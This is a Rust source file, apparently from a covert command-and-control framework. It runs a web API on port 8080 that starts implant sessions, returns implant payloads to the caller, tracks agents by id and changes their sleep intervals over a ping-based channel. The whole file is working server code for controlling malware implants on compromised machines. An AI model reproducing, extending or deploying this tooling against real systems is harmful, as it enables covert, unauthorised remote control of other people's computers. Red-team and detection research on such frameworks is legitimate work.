use crate::{worker::session_worker, CHANNEL, GLOBAL_CONF};
use covert_c2_ping_common::PingMessage;
use serde::Deserialize;
use std::{
    sync::atomic::{AtomicU16, Ordering},
    time::Duration,
};
use tokio::task;
use warp::{http::Response, Filter, Rejection, Reply};

#[derive(Deserialize)]
pub struct NewAgent {
    pub arch: String,
    pub sleep: u64,
    pub pipe: String,
}

#[derive(Deserialize)]
pub struct PatchAgent {
    pub agentid: u16,
    pub sleep: Option<u64>,
}

pub async fn web_worker() -> () {
    let patch = warp::patch()
        .and(warp::body::json::<PatchAgent>())
        .and_then(update_agent);
    let get = warp::get().map(|| "Connected agents");
    let post = warp::post()
        .and(warp::body::json::<NewAgent>())
        .and_then(start_session);

    let api = warp::path("api/agents").and(get.or(post).or(patch));
    //warp::filters::fs::dir("./static");
    warp::serve(api).bind(([0, 0, 0, 0], 8080)).await;
}

static AGENT_COUNT: AtomicU16 = AtomicU16::new(1);

async fn start_session(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
    let (payload, connection) =
        covert_server::start_implant_session(&GLOBAL_CONF.ts, &new_agent.arch, &new_agent.pipe)
            .await
            .or(Err(warp::reject::reject()))?;

    let id: u16 = AGENT_COUNT.fetch_add(1, Ordering::SeqCst);
    task::spawn(session_worker(connection, id));
    let response = Response::builder()
        .body(payload)
        .or(Err(warp::reject::reject()))?;
    Ok(response)
}

async fn update_agent(config: PatchAgent) -> Result<impl Reply, Rejection> {
    if let Some(sleep) = config.sleep {
        CHANNEL.lock().await.put_message(
            PingMessage::SleepMessage(Duration::from_secs(sleep.into())),
            config.agentid,
        );
    }
    Ok(warp::reply())
}
